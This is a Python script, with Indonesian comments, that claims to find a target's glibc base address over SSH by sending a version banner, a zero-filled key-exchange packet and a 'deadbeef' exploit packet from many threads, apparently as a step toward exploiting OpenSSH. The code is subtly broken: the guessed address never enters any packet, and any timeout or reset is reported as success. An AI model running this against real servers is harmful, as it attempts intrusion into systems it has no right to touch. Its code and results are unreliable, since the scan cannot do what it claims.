#!/usr/bin/env python3

import socket
import struct
import argparse
import threading
from queue import Queue, Empty
import sys
import os

# ANSI color codes
GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
RESET = "\033[0m"

# --- PENGATURAN ARSITEKTUR TARGET ---
# PENGATURAN UNTUK SISTEM 64-BIT (PALING UMUM SAAT INI)
GLIBC_BASE_START = 0x7f0000000000
GLIBC_BASE_END = 0x7fffffffffff
GLIBC_BASE_STEP = 0x100000

# PENGATURAN UNTUK SISTEM 32-BIT (UNTUK MESIN LAMA)
# GLIBC_BASE_START = 0xb7000000
# GLIBC_BASE_END = 0xb8000000
# GLIBC_BASE_STEP = 0x10000
# --- AKHIR PENGATURAN ---

MAX_THREADS = 40
PORT_DEFAULT = 22
TIMEOUT_DEFAULT = 1.0

STOP_EVENT = threading.Event()

def test_glibc_base(ip, port, glibc_base, timeout):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.settimeout(timeout)
            sock.connect((ip, port))

            ssh_version = b"SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.1\r\n"
            sock.sendall(ssh_version)

            banner = sock.recv(256)
            if not banner or b"SSH-2.0" not in banner:
                return False, "Invalid banner"

            kexinit_payload = b"\x00" * 36
            packet_len = len(kexinit_payload) + 5
            packet = struct.pack('>I', packet_len) + struct.pack('B', 20) + kexinit_payload
            sock.sendall(packet)
            
            sock.recv(1024)

            exploit_packet = bytearray(1024)
            exploit_packet[:4] = b"\xde\xad\xbe\xef"
            sock.sendall(exploit_packet)

            sock.settimeout(0.5)
            try:
                sock.recv(1)
            except socket.timeout:
                return True, "Connection timed out (possible success)"
            except (ConnectionResetError, BrokenPipeError):
                return True, "Connection reset (possible success)"

            return False, "No vulnerable response"
    except Exception:
        return False, "Connection/Socket Error"
    return False, "No response"


def worker(ip, port, timeout, glibc_base_queue, result_queue):
    while not STOP_EVENT.is_set():
        try:
            glibc_base = glibc_base_queue.get_nowait()
        except Empty:
            break
        
        if glibc_base % (GLIBC_BASE_STEP * 5) == 0:
            total_range = GLIBC_BASE_END - GLIBC_BASE_START
            current_progress = glibc_base - GLIBC_BASE_START
            if total_range > 0:
                percentage = (current_progress / total_range) * 100
                sys.stderr.write(f"\r{YELLOW}[i] Memindai... {percentage:.2f}% (Testing: 0x{glibc_base:08x}){RESET}")
                sys.stderr.flush()

        success, msg = test_glibc_base(ip, port, glibc_base, timeout)

        if success:
            result_queue.put((glibc_base, success, msg))
            STOP_EVENT.set()

        glibc_base_queue.task_done()

def main():
    parser = argparse.ArgumentParser(description="GLIBC base scanner utility")
    parser.add_argument("target", help="A single IP address")
    parser.add_argument("--port", type=int, default=PORT_DEFAULT, help=f"Port (default {PORT_DEFAULT})")
    parser.add_argument("--timeout", type=float, default=TIMEOUT_DEFAULT, help=f"Timeout (default {TIMEOUT_DEFAULT}s)")
    args = parser.parse_args()

    ip = args.target
    port = args.port
    timeout = args.timeout

    glibc_base_queue = Queue()
    result_queue = Queue()
    for base in range(GLIBC_BASE_START, GLIBC_BASE_END, GLIBC_BASE_STEP):
        glibc_base_queue.put(base)

    threads = []
    for _ in range(MAX_THREADS):
        t = threading.Thread(target=worker, args=(ip, port, timeout, glibc_base_queue, result_queue))
        t.daemon = True
        t.start()
        threads.append(t)

    try:
        glibc_base_queue.join()
    except KeyboardInterrupt:
        sys.stderr.write("\n" + f"{RED}[!] Proses dihentikan oleh pengguna.{RESET}\n")
    finally:
        STOP_EVENT.set()
        while not glibc_base_queue.empty():
            try:
                glibc_base_queue.get_nowait()
            except Empty:
                break
            glibc_base_queue.task_done()
        for t in threads:
            t.join()

    sys.stderr.write("\r" + " " * 80 + "\r") 
    sys.stderr.flush()

    if not result_queue.empty():
        base, success, msg = result_queue.get()
        hex_base = f"0x{base:08x}"
        sys.stderr.write(f"{GREEN}[+] GLIBC base kemungkinan ditemukan: {hex_base} ({msg}){RESET}\n")
        print(hex_base)
        sys.exit(0)
    else:
        sys.stderr.write(f"{RED}[-] Tidak ada GLIBC base yang ditemukan untuk {ip}{RESET}\n")
        sys.exit(1)

if __name__ == "__main__":
    main()
